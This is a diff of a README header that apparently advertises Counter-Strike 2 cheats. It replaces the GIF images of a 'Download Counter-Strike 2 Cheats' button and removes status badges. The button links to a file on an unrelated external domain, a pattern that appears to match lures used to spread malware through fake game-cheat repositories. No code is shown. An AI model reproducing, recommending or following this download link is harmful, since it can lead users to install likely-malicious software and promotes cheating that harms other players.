@@ -10,21 +10,11 @@
 <p align="center">
   <a href="https://shanxisaide.com/s/file">
     <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e86a652e1c73cd64d7e19a13.gif" />
-      <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/1627ded995739f4bff03943b.gif" />
-      <img alt="DOWNLOAD CHEATS" src="https://designreadme.top/assets/1627ded995739f4bff03943b.gif" />
+      <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/ad5fe16626d8dec8fcb7da6b.gif" />
+      <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/4e5cec5f5022a4f397358fe4.gif" />
+      <img alt="Download Counter-Strike 2 Cheats" src="https://designreadme.top/assets/4e5cec5f5022a4f397358fe4.gif" width="214" height="46" />
     </picture>
   </a>
-</p>
-
-<p align="center">
-  <img alt="Version" src="https://img.shields.io/badge/v3.1-STABLE-06B6D4?style=flat-square" />
-  &nbsp;
-  <img alt="Platform" src="https://img.shields.io/badge/WIN-10_%7C_11-0EA5E9?style=flat-square&logo=windows&logoColor=white" />
-  &nbsp;
-  <img alt="Status" src="https://img.shields.io/badge/STATUS-ONLINE-22C55E?style=flat-square" />
-  &nbsp;
-  <img alt="Modules" src="https://img.shields.io/badge/MODULES-8-F59E0B?style=flat-square" />
 </p>
 
 <!-- Section Divider -->
